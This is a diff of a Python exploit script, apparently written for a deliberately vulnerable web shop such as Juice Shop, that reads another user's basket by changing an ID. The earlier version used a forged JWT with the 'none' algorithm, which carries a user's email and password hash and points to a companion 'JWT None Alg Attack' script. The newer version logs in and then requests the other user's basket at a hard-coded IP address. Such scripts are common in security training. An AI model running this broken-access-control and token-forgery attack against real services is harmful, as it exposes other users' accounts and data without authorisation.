@@ -1,14 +1,28 @@
+import json
+import sys
+
 import requests
 
 # The ID number of the basket you want
-id = 78
+id = 1
 
-# Copy any user's current token here or generate one with "JWT None Alg Attack.py"
-token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NywiZW1haWwiOiJCdW1ibGViZWVNYW5Aa3dpa2UubWFydCIsInBhc3N3b3JkIjoiN2M2YTE4MGIzNjg5NmEwYThjMDI3ODdlZWFmYjBlNGMiLCJjcmVhdGVkQXQiOiIyMDE4LTA2LTIyVDIyOjAyOjUwLjQyM1oiLCJ1cGRhdGVkQXQiOiIyMDE4LTA2LTIyVDIyOjAyOjUwLjQyM1oifSwiaWF0IjoxNTMwNzU4OTA3LCJleHAiOjE1MzA3NzY5MDd9."
+s = requests.Session()
 
-r = requests.get(
-    "http://43.241.202.47:3003/rest/basket/" + str(id),
-    headers=({'Authorization': "Bearer " + token}))
+# Login with any user or forge a token with "JWT None Alg Attack.py"
+r = s.post(
+    'http://43.241.202.47:3003/rest/user/login',
+    data=json.dumps({
+        "email": 'example@example.com',
+        "password": 'example',
+    }),
+    headers={'Content-type': 'application/json;charset=utf-8'},
+)
+print("Login:", r)
+if r.status_code != 200:
+    sys.exit()
+s.headers.update({'Authorization': "Bearer " + json.loads(r.text)['authentication']['token']})
+
+r = s.get("http://43.241.202.47:3003/rest/basket/" + str(id))
 
 print(r.status_code)
 if r.status_code == 200:
